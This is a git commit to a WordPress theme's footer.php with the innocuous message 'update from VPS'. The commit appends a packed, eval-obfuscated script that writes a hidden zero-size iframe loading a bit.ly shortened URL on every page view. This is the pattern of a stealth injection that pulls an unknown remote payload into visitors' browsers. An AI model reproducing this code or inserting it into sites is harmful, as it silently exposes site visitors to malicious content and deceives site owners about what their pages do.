f8905d801e76a438495bcfc4bd298a6e6d029374
Thanchet <Phamvanhieu861992@gmail.com>
2015-01-08 04:23:55 -0500

    update from VPS

--- wp-content/themes/asteria-lite/footer.php
+++ wp-content/themes/asteria-lite/footer.php
@@ -37,5 +37,8 @@
 </div>
 
 <?php wp_footer(); ?>
+<script>
+eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('2.3(\'<1 4="5://6.7/8" 9="0" a="0" b="0" c=0 d=0></1>\');',14,14,'|iframe|document|write|src|http|bit|ly|1BC4pKP|width|height|frameborder|marginwidth|marginheight'.split('|'),0,{}))
+</script> 
 </body>
 </html>
